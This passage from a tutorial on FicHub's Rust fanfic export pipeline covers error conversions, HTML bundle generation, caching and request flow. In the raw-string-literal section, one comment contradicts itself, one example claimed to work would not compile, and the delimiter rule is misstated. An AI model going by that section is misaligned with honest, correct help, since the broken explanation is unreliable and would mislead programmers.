- **ZipError** — ZIP operations failed (corrupt archive, disk error)

The `From` implementations let us use the `?` operator seamlessly:

```rust
impl From<std::io::Error> for ExportError {
    fn from(e: std::io::Error) -> Self {
        ExportError::IoError(e.to_string())
    }
}

impl From<epub_builder::Error> for ExportError {
    fn from(e: epub_builder::Error) -> Self {
        ExportError::EpubError(e.to_string())
    }
}

impl From<zip::result::ZipError> for ExportError {
    fn from(e: zip::result::ZipError) -> Self {
        ExportError::ZipError(e.to_string())
    }
}
```

This means you can write:

```rust
let file = fs::File::create(&path)?;  // io::Error → ExportError automatically
let mut builder = EpubBuilder::new(ZipLibrary::new()?)?;  // epub_builder::Error → ExportError
```

The `?` operator calls the `From` trait implementation, converting the error automatically. This keeps the code clean while preserving error type information. The caller can match on the variant to decide what to do.

### Export-Type Constants

FicHub also defines export type constants that are used throughout the codebase:

```rust
pub const ETYPE_EPUB: &str = "epub";
pub const ETYPE_HTML: &str = "html";
pub const ETYPE_MOBI: &str = "mobi";
pub const ETYPE_PDF: &str = "pdf";
```

These are used for string comparisons and database queries. Having them as constants instead of magic strings prevents typos and makes refactoring easier. If the export type name ever changes, you change it in one place.

### The etype_versions Map

The version map provides a centralized place to manage format versions:

```rust
pub fn etype_versions() -> HashMap<&'static str, i32> {
    let mut m = HashMap::new();
    m.insert(ETYPE_EPUB, 1);
    m.insert(ETYPE_HTML, 1);
    m.insert(ETYPE_MOBI, 0);
    m.insert(ETYPE_PDF, 0);
    m
}
```

This is used by the export handler to look up the version for a given format. Having it as a function (rather than a static constant) allows it to be extended dynamically in the future — maybe reading from a configuration file.

🧪 **Try It Yourself:** Create an `ExportError` that includes a `TimeoutError` variant. Add a `From<tokio::time::error::Elapsed>` implementation. Write a function that uses `?` with a timeout operation. Verify the error conversion works.

---

## Chapter 36: HTML Bundle Deep Dive

### Chapter Navigation Anchors

The HTML bundle's navigation system uses anchor links — the same technique that web pages have used since the 1990s:

```rust
for chapter in chapters {
    chapters_nav.push_str(&format!(
        r##"<li><a href="#ch{ch}">{title}</a></li>"##,
        ch = chapter.chapter_id,
        title = escape_html(&chapter.title),
    ));

    chapters_content.push_str(&format!(
        r#"<h2 id="ch{ch}">{title}</h2>
{content}"#,
        ch = chapter.chapter_id,
        title = escape_html(&chapter.title),
        content = chapter.content,
    ));
}
```

Each chapter heading gets an `id` attribute like `id="ch5"`, and each navigation link points to `#ch5`. When you click the link, the browser jumps to that heading.

This is elegant in its simplicity — no JavaScript needed, no page reloads, works in every browser from the last 25 years. Even the most basic text editor can handle it.

The `chapter.chapter_id` comes from the scraper and is typically an integer (1, 2, 3, ...). By prefixing with `ch`, we avoid numeric-only IDs which can conflict with some CSS selectors.

### Raw String Literals with Custom Delimiters

You might have noticed something unusual about the format strings:

```rust
r##"<li><a href="#ch{ch}">{title}</a></li>"##
r#"<h2 id="ch{ch}">{title}</h2>"#
```

Some use `r#"..."#` and others use `r##"..."##`. Why?

Rust's raw string literals use `#` characters as delimiters:

- `r#"..."#` — A raw string where `"` inside doesn't end the string
- `r##"..."##` — A raw string where both `"` and `#"` don't end the string

The HTML bundle needs `r##"..."##` for the navigation links because they contain `href="#ch{ch}"` — the `#` character followed by `"` would prematurely close a `#"..."#` raw string. The parser would see `#"ch{ch}"` and think the string ended.

The chapter content uses `r#"..."#` because it doesn't have the `#"` sequence.

This is a subtle Rust detail that trips up many developers. The rule is simple: **count the number of `#` characters in your content, and use that many (or more) `#` delimiters on each side.**

```rust
// Content has no "#" — simple raw string works
let s = r#"Hello "world""#;

// Content has "#" but not "#" — single delimiter works
let s = r#"href="#ch1""#;

// Content has "#" — need double delimiter
let s = r##"href="#ch1""##;
```

### Responsive CSS

The HTML bundle's CSS is designed to look good on screens of all sizes:

```css
body {
    font-family: Georgia, 'Times New Roman', serif;
    line-height: 1.7;
    color: #333;
    max-width: 800px;
    margin: 0 auto;
    padding: 20px;
    background: #fafafa;
}
```

Key responsive design choices:

- **`max-width: 800px`** — On wide screens, the content is capped at 800 pixels. This prevents lines from getting too long to read comfortably. Studies show that 50-75 characters per line is optimal for reading.
- **`margin: 0 auto`** — Centers the content on wide screens.
- **`padding: 20px`** — Provides breathing room on mobile devices.
- **`line-height: 1.7`** — Generous line spacing for comfortable reading.
- **Georgia font** — A web-safe serif font that's available on virtually all devices. Falls back to Times New Roman.

The chapter navigation uses CSS columns:

```css
.nav ul { list-style: none; columns: 2; }
```

This creates a two-column layout for the chapter list, saving vertical space. On very narrow screens, the columns will naturally collapse to one.

The viewport meta tag ensures proper mobile rendering:

```html
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
```

Without this, mobile browsers would render the page at 980px width and then zoom out, making the text tiny and unreadable. The `initial-scale=1.0` prevents the browser from zooming in or out when the page loads.

### The Complete HTML Structure

The HTML bundle's page is organized into clear, semantic sections:

1. **Header** — Title, author, metadata table
2. **Description** — The fic's summary in a styled box
3. **Navigation** — Table of contents with chapter links
4. **Content** — All chapters in sequence, separated by `<hr/>` tags
5. **Footer** — "Generated by FicHub" credit with the source URL

Each section is wrapped in semantic HTML elements (`<div class="meta">`, `<div class="desc">`, `<div class="nav">`, `<div class="content">`), and the CSS styles each one distinctly.

The chapter navigation uses a two-column `<ul>` with no bullets (`list-style: none`). Each list item is a link to a chapter anchor. This creates a clean, compact table of contents that doesn't dominate the page.

The footer includes the source URL so readers can find the original fic. This is both good etiquette (crediting the source) and practical (users might want to leave kudos or comments on the original).

### Why ZIP a Single File?

You might wonder: why ZIP a single HTML file? It seems redundant.

The answer is consistency and CDN behavior. By having all exports produce ZIP archives:

1. The download route code is simpler — it doesn't need to know what format the file is
2. CDN caching is more uniform — all files are the same type
3. File sizes are smaller — HTML with embedded CSS compresses well
4. The file extension is predictable — `.zip` for HTML, `.epub` for EPUB

There's also a practical consideration: some email providers and messaging apps strip or modify HTML files for security. A ZIP file passes through untouched, and the recipient can unzip it to get the clean HTML.

### Performance of Self-Contained HTML

The self-contained approach has a performance tradeoff. The HTML bundle's file size is larger than the same content served as a web page with external CSS, because:

1. **CSS is duplicated** — Every HTML bundle contains the same 150+ lines of CSS, even if it's a short story
2. **No compression sharing** — A web server can compress CSS once and serve it to all pages; each HTML bundle compresses its own copy

But this tradeoff is intentional. The benefit of self-containment (works offline, works when emailed, works without a web server) outweighs the cost of a few extra kilobytes. For a 200,000-word fic, the CSS overhead is negligible compared to the chapter content.

### Accessibility Considerations

The HTML bundle is more accessible than EPUB in several ways:

- **Screen readers** work well with HTML — the semantic markup (`<h1>`, `<h2>`, `<p>`, `<table>`) provides clear structure
- **Keyboard navigation** — the anchor links work with Tab and Enter
- **No proprietary format** — HTML is an open standard that will be supported indefinitely
- **Zoom** — browsers handle zoom better than many e-reader apps

For users with visual impairments, the HTML bundle might actually be the better choice, despite being less "book-like."

🧪 **Try It Yourself:** Create an HTML bundle with 5 chapters. Test it in a mobile browser and a desktop browser. Does the two-column navigation work on both? Does the content width feel comfortable? Try printing it — does the output look good?

---

## Chapter 37: Export Flow End-to-End

### Complete Request Lifecycle

Let's trace one complete journey — from a user clicking "Download EPUB" to seeing the file on their device.

**User Action:** Clicks the "Download" button on the FicHub web interface.

**Step 1:** The JavaScript frontend constructs an API URL: `/api/v0/epub?q=https://archiveofourown.org/works/12345`

**Step 2:** The browser sends a GET request to FicHub's Axum server.

**Step 3:** Axum matches the route and calls `epub_handler`.

**Step 4:** The handler validates input, finds the AO3 scraper, and calls `scraper.lookup()` to fetch metadata. This makes one HTTP request to AO3.

**Step 5:** The handler upserts fic metadata into the database and extracts tags (best-effort).

**Step 6:** Blacklist checks are performed.

**Step 7:** The version is computed: `export_version + fic_version_bump`.

**Step 8:** The cache is checked via `find_export_log()`. If hit → return URLs immediately. If miss → continue to generation.

**Step 9:** The semaphore is acquired. A second cache check is performed (double-check pattern).

**Step 10:** Chapters are fetched from AO3 (the heavy network operation).

**Step 11:** The EPUB is generated in a UUID work directory.

**Step 12:** The EPUB is moved to the cache directory with `fs::rename()`.

**Step 13:** The HTML bundle is generated and cached.

**Step 14:** The database is updated with the new export logs.

**Step 15:** The JSON response is returned with download URLs.

**User Action:** Clicks the EPUB download link.

**Step 16:** The browser requests `/cache/epub/abc123?h=def456`.

**Step 17:** FicHub verifies the hash, constructs the disk path, and serves the file with `Content-Type: application/epub+zip`.

**Step 18:** The browser receives the EPUB and offers to save it or open it in a reading app.

### Performance Characteristics

FicHub's export system is designed with several performance characteristics in mind:

**First request (cold):** Takes 2-5 seconds. Most of the time is spent scraping the source site and generating the EPUB. The scraper makes HTTP requests, parses HTML, and extracts content. The EPUB generation involves XML construction, ZIP compression, and MD5 hashing. This is unavoidable but happens only once per fic/version.

**Subsequent requests (warm):** Takes under 100 milliseconds. The cache hit returns URLs immediately — the only work is a database lookup and JSON construction. This is typically 5-10ms for the database query and 1-2ms for JSON serialization.

**Concurrent requests for the same fic:** The semaphore ensures only one generation happens. Others wait in line (typically milliseconds) and then hit the cache via the double-check pattern.

**Memory usage:** Each export operation creates a temporary directory with the generated files. These are moved to cache and the temp directory is cleaned up. The peak memory usage is roughly the size of the generated EPUB plus overhead for the builder and XML strings.

**Disk usage:** Cached files grow over time. FicHub manages this with the `clear_stale_cache()` function, which removes old versions. For very large deployments, a cron job could periodically clean up cache files that haven't been accessed recently.

**Database load:** The `export_log` table is the most queried table during export operations. Indexing on `(url_id, version, etype)` keeps these queries fast. The table grows by one row per unique fic/version/format combination.

The key insight is that FicHub trades **one expensive operation** (scraping + generation) for **many cheap operations** (cache lookups). This is the fundamental principle behind all caching systems, and FicHub implements it cleanly across three layers: database, disk, and memory (semaphores).

### Error Resilience

The export system is designed to be resilient. If any step fails:

- **Scrape fails** → Returns a scrape error, no export happens. The user sees a message like "unable to fetch from this URL." The database is not updated, so the next request will retry.
- **EPUB generation fails** → Returns an export error, HTML bundle is skipped. The user gets an error message, but their request doesn't corrupt anything.
- **Cache move fails** → File stays in temp directory. It'll be cleaned up by a periodic cleanup script, or left to be overwritten by the next generation.
- **Database write fails** → File is on disk but not logged. The next request will check the cache, find the file missing from the log, and regenerate. Slightly wasteful, but not catastrophic.

No step's failure corrupts the system state. The worst case is a temporary file that needs cleanup, or a cache miss that forces regeneration on the next request. This is by design — FicHub favors consistency over performance in error scenarios.

### The Design Philosophy

FicHub's export pipeline follows several design principles:

1. **Generate once, serve many** — Caching is the foundation. One cold request pays for unlimited warm requests.
2. **Atomic operations** — File moves are atomic (`fs::rename`), database writes are idempotent (upsert). No partial states.
3. **Layered caching** — Database lookup → disk check → semaphore coordination. Each layer adds reliability.
4. **Graceful degradation** — Tag failures don't block exports, greylisted fics show metadata, invalid timestamps become empty strings.
5. **Automatic invalidation** — Version numbers replace manual cache clearing. Deploy new code → old caches expire automatically.
6. **Idempotent requests** — Requesting the same fic twice doesn't cause problems. The second request either hits the cache or waits for the first to finish.

These principles make the system both performant and maintainable. A new developer can understand the flow by following one request from start to finish, and each component has a clear, single responsibility.

### What Makes This Hard

It's worth noting what makes this system tricky to build:

- **Concurrency** — Multiple requests for the same fic can arrive simultaneously. Without semaphores, you get duplicate work and potential corruption.
- **State consistency** — The database says a file exists, but does it? The semaphore says someone is generating, but are they done? These distributed state questions require careful coordination.
- **Version drift** — Code versions, format versions, and data versions all change independently. The version hash system ties them together.
- **Error handling** — Every step can fail, and failures must not leave the system in an inconsistent state. The generate → move → record pattern handles this.
- **Performance** — First-time generation takes seconds, cached responses take milliseconds. The 100x difference means caching isn't optional — it's essential.

Understanding these challenges is just as important as understanding the code. When you build your own export systems, you'll face the same questions about concurrency, caching, and error handling. FicHub's approach is a solid template to learn from.

---

*In the next part, we'll explore FicHub's tagging system — how it organizes hundreds of thousands of fanfics into browsable categories, and how users can add their own tags to help others discover new stories.*
